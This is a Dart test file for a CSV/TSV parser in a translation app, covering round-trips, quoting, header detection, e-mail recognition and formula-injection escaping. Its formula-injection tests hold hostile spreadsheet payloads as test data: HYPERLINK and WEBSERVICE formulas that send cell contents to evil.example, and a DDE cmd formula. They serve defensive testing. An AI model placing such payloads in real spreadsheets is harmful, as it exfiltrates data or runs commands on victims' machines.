// Markup fixtures are built from adjacent strings.
// ignore_for_file: missing_whitespace_between_adjacent_strings
import 'package:flutter_test/flutter_test.dart';
import 'package:mozhi/documents/core/core.dart';
import 'package:mozhi/documents/core/parsers/delimited_parser.dart';

import '../helpers/document_helpers.dart';

void main() {
  group('parseDelimited', () {
    const products =
        'id,name,price,description,url,released,sku\r\n'
        '1,Red chair,19.99,"A comfortable chair, made of ""real"" wood",'
        'https://example.com/1,2024-01-31,CH-001\r\n'
        '2,Blue table,149,"Seats four.\r\nFolds away.",'
        'https://example.com/2,2024-02-01,TB-002\r\n'
        '3,Lamp,"1,299.00",,https://example.com/3,2024-03-15,LM-003\r\n';

    test('round-trips and translates text columns only', () {
      final document = parseDelimited(products, DocumentFormat.csv);
      expect(document.format, DocumentFormat.csv);
      expectRoundTrip(document, products);
      expect(texts(document), [
        'Red chair',
        'A comfortable chair, made of "real" wood',
        'Blue table',
        'Seats four.\nFolds away.',
        'Lamp',
      ]);
      expect(document.segments.first.label, 'name:2');
    });

    test('quotes translations that need it', () {
      final document = parseDelimited(products, DocumentFormat.csv);
      final output = document.render([
        'Chaise rouge, confortable',
        'Une chaise "confortable"',
        'Table bleue',
        'Quatre places.\nSe replie.',
        'Lampe',
      ]);
      expect(
        output,
        '${'id,name,price,description,url,released,sku\r\n'
            '1,"Chaise rouge, confortable",19.99,"Une chaise ""confortable""",'
            'https://example.com/1,2024-01-31,CH-001\r\n'
            '2,Table bleue,149,"Quatre places.\r\nSe replie.",'
            'https://example.com/2,2024-02-01,TB-002\r\n'}'
        '3,Lampe,"1,299.00",,https://example.com/3,2024-03-15,LM-003\r\n',
      );
    });

    test('detects semicolons and keeps a header-less phrase list', () {
      const european = 'Bonjour;Hello\nMerci beaucoup;Thank you\n';
      final document = parseDelimited(european, DocumentFormat.csv);
      expectRoundTrip(document, european);
      // Two short distinct labels: read as a header.
      expect(texts(document), ['Merci beaucoup', 'Thank you']);

      const phrases = 'Good morning\nThank you\nSee you soon\n';
      expect(texts(parseDelimited(phrases, DocumentFormat.csv)), [
        'Good morning',
        'Thank you',
        'See you soon',
      ]);
      const titled = 'text\nGood morning\nThank you\n';
      expect(texts(parseDelimited(titled, DocumentFormat.csv)), [
        'Good morning',
        'Thank you',
      ]);
    });

    test('keeps code columns and formulas', () {
      const sheet =
          'status\tnote\n'
          'active\tCall back tomorrow\n'
          'active\t=SUM(A1:A3)\n'
          'inactive\tNo answer\n'
          'active\t42\n';
      final document = parseDelimited(sheet, DocumentFormat.tsv);
      expectRoundTrip(document, sheet);
      expect(texts(document), ['Call back tomorrow', 'No answer']);
      final output = document.render(['Morgen\tzurückrufen', 'Keine\nAntwort']);
      expect(output, contains('active\tMorgen zurückrufen\n'));
      expect(output, contains('inactive\tKeine Antwort\n'));
    });

    test('keeps a byte order mark and odd fields', () {
      const odd = '\uFEFFname,comment\nAda,"quoted"tail\n';
      final document = parseDelimited(odd, DocumentFormat.csv);
      expectRoundTrip(document, odd);
      expect(texts(document), ['Ada']);
    });

    test('rejects an unterminated quoted field', () {
      expect(
        () => parseDelimited('a,b\n"open,c\n', DocumentFormat.csv),
        throwsA(
          isA<DocumentParseException>().having(
            (error) => error.message,
            'message',
            contains('line 2'),
          ),
        ),
      );
    });
  });

  group('formula injection', () {
    const sheet =
        'id,text\n1,Hello there\n2,How are you\n3,Good morning\n'
        '4,"Thanks, bye"\n';

    test('translations that start like a formula get a quote', () {
      final document = parseDelimited(sheet, DocumentFormat.csv);
      expect(texts(document), hasLength(4));
      final output = document.render([
        '=HYPERLINK("https://evil.example/?d="&A1,"Click")',
        "=cmd|' /C calc'!A0",
        '  @SUM(1+1)',
        '+1+1',
      ]);
      expect(
        output,
        'id,text\n'
        '1,"\'=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"\n'
        "2,'=cmd|' /C calc'!A0\n"
        "3,'  @SUM(1+1)\n"
        '4,"\'+1+1"\n',
      );
      final more = document.render(['-2+3', '\t=1+1', '\r=1+1', 'A = B']);
      expect(
        more,
        'id,text\n'
        "1,'-2+3\n"
        "2,'\t=1+1\n"
        '3,"\'\r=1+1"\n'
        '4,"A = B"\n',
      );
    });

    test('in TSV too, without quotes', () {
      const tsv = 'id\ttext\n1\tHello there\n2\tHow are you\n';
      final document = parseDelimited(tsv, DocumentFormat.tsv);
      final output = document.render([
        '=WEBSERVICE("https://evil.example/"&A1)',
        '\t=1+1',
      ]);
      expect(
        output,
        'id\ttext\n'
        '1\t\'=WEBSERVICE("https://evil.example/"&A1)\n'
        "2\t' =1+1\n",
      );
    });

    test('cells that already start that way are left as they are', () {
      const list =
          'id,item\n1,- buy milk today\n2,@team please review\n'
          '3,+ add the notes\n4,Some plain words\n';
      final document = parseDelimited(list, DocumentFormat.csv);
      expect(texts(document), [
        '- buy milk today',
        '@team please review',
        '+ add the notes',
        'Some plain words',
      ]);
      final output = document.render([
        '- Milch kaufen',
        '@team bitte prüfen',
        '+ Notizen ergänzen',
        '=1+1',
      ]);
      expect(
        output,
        'id,item\n1,- Milch kaufen\n2,@team bitte prüfen\n'
        "3,+ Notizen ergänzen\n4,'=1+1\n",
      );
    });
  });

  group('values', () {
    test('e-mail addresses are recognised in linear time', () {
      const contacts =
          'id,mail,note\n'
          '1,ada@example.com,Call back soon\n'
          '2,bob.smith@mail.example.org,Sent the offer\n'
          '3,cy@host.co,Waiting for an answer\n';
      final document = parseDelimited(contacts, DocumentFormat.csv);
      expect(texts(document), [
        'Call back soon',
        'Sent the offer',
        'Waiting for an answer',
      ]);
      // Not addresses: translated (as text with words).
      const odd =
          'id,text\n'
          '1,@example.com hello\n'
          '2,a@b@c.de hello\n'
          '3,ab@.de hello\n';
      expect(texts(parseDelimited(odd, DocumentFormat.csv)), hasLength(3));
      for (final cell in ['ab@cd', 'ab@cd.', '@cd.ef']) {
        final one = parseDelimited(
          'id,text\n1,Hello there\n2,Good bye\n3,$cell\n',
          DocumentFormat.csv,
        );
        expect(texts(one), contains(cell), reason: cell);
      }
      final address = parseDelimited(
        'id,text\n1,Hello there\n2,Good bye\n3,ab@cd.ef\n',
        DocumentFormat.csv,
      );
      expect(texts(address), isNot(contains('ab@cd.ef')));
    });

    test('long cells are text, whatever they look like', () {
      final long = 'a@${'b' * 300}.com';
      final document = parseDelimited(
        'id,text\n1,Hello there\n2,$long\n',
        DocumentFormat.csv,
      );
      // Protected as an e-mail address inside the cell instead.
      expect(document.segments, hasLength(1));
      expect(document.render(['Hallo', 'x']), contains(long));
    });
  });

  test('keeps cells whose words are all placeholders', () {
    const sheet = 'title,body\n{{name}},Some text here\n';
    final document = parseDelimited(sheet, DocumentFormat.csv);
    expectRoundTrip(document, sheet);
    expect(texts(document), ['Some text here']);
    expect(
      () => parseDelimited('a', DocumentFormat.po),
      throwsA(isA<AssertionError>()),
    );
  });
}
